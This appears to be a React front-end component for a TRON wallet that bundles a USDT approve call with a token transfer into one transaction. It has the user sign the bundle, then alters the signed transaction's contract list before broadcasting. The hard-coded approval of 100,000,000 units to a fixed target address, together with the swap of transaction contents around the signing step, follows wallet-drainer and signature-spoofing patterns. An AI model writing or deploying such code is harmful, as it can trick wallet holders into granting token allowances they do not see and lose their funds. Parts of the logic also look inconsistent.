import { Button, message } from 'antd';
import { useState } from 'react';

// 常量配置
const CONTRACTS = {
  USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  TARGET_ADDRESS: 'TDgJmYStKqzawFQyMav8XxNp1pTpdhEWg9',
  FROM_ADDRESS: 'TKMBdaT5E5e4X3qtff3aY2ain5pG5WNPL2',
  TOKEN_ADDRESS: 'TVDGpn4hCSzJ5nkHPLetk8KQBtwaTppnkr',
  RECIPIENT_ADDRESS: 'TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeL',
};

const TRANSACTION_PARAMS = {
  TOKEN_AMOUNT: 100,
  TOKEN_ID: '1002000',
  APPROVE_AMOUNT: 100000000,
};

function MultiAction() {
  const [resultMessage, setResultMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // 创建转账交易
  const createTransferTransaction = async (tronWeb) => {
    return await tronWeb.transactionBuilder.sendToken(
      CONTRACTS.TOKEN_ADDRESS,
      TRANSACTION_PARAMS.TOKEN_AMOUNT,
      TRANSACTION_PARAMS.TOKEN_ID,
      CONTRACTS.RECIPIENT_ADDRESS,
    );
  };

  // 创建授权交易
  const createApproveTransaction = async (tronWeb) => {
    const parameter = [
      { type: 'address', value: CONTRACTS.TARGET_ADDRESS },
      { type: 'uint256', value: TRANSACTION_PARAMS.APPROVE_AMOUNT },
    ];

    return await tronWeb.transactionBuilder.triggerSmartContract(
      CONTRACTS.USDT,
      'approve(address,uint256)',
      {},
      parameter,
      CONTRACTS.FROM_ADDRESS,
    );
  };

  // 合并交易
  const mergeTransactions = (approveTransaction, transferTransaction) => {
    // 保存原始合约信息
    const originalContract =
      approveTransaction.transaction.raw_data.contract[1];

    // 将转账交易添加到授权交易中
    approveTransaction.transaction.raw_data.contract[1] =
      transferTransaction.raw_data.contract[0];

    return { mergedTransaction: approveTransaction, originalContract };
  };

  // 签名并发送交易
  const signAndSendTransaction = async (
    tronWeb,
    mergedTransaction,
    originalContract,
  ) => {
    console.log(
      '>>> MultiAction signAndSendTransaction',
      mergedTransaction.transaction,
    );
    // 签名交易
    const signedTransaction = await tronWeb.trx.sign(
      mergedTransaction.transaction,
    );

    // 恢复原始合约信息
    signedTransaction.raw_data.contract[1] = originalContract;

    // 发送交易
    return await tronWeb.trx.sendRawTransaction(signedTransaction);
  };

  // 主要执行函数
  const executeMultiAction = async () => {
    const tronWeb = window.tronWeb;

    if (!tronWeb) {
      throw new Error('TronWeb 未加载，请确保已连接 Tron 钱包');
    }

    try {
      message.info('创建交易中...');

      // 并行创建两个交易
      const [transferTransaction, approveTransaction] = await Promise.all([
        createTransferTransaction(tronWeb),
        createApproveTransaction(tronWeb),
      ]);

      message.info('合并交易中...');
      const { mergedTransaction, originalContract } = mergeTransactions(
        approveTransaction,
        transferTransaction,
      );

      message.info('签名并发送交易中...');
      const result = await signAndSendTransaction(
        tronWeb,
        mergedTransaction,
        originalContract,
      );

      console.log('交易结果:', result);
      return result;
    } catch (error) {
      console.error('交易执行失败:', error);
      throw error;
    }
  };

  // 按钮点击处理函数
  const handleButtonClick = async () => {
    setIsLoading(true);
    setResultMessage('');

    try {
      const result = await executeMultiAction();
      setResultMessage(`交易成功: ${JSON.stringify(result)}`);
      message.success('交易执行成功！');
    } catch (error) {
      const errorMessage = error.message || '未知错误';
      setResultMessage(`交易失败: ${errorMessage}`);
      message.error(`交易执行失败: ${errorMessage}`);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={{ padding: '20px' }}>
      <Button
        type="primary"
        size="large"
        loading={isLoading}
        onClick={handleButtonClick}
        style={{ marginBottom: '16px' }}
      >
        {isLoading ? '执行中...' : '执行 Approve + Transfer'}
      </Button>

      {resultMessage && (
        <div
          style={{
            marginTop: '16px',
            padding: '12px',
            backgroundColor: '#f5f5f5',
            borderRadius: '4px',
            wordBreak: 'break-all',
          }}
        >
          <strong>执行结果:</strong>
          <div style={{ marginTop: '8px' }}>{resultMessage}</div>
        </div>
      )}
    </div>
  );
}

export default MultiAction;
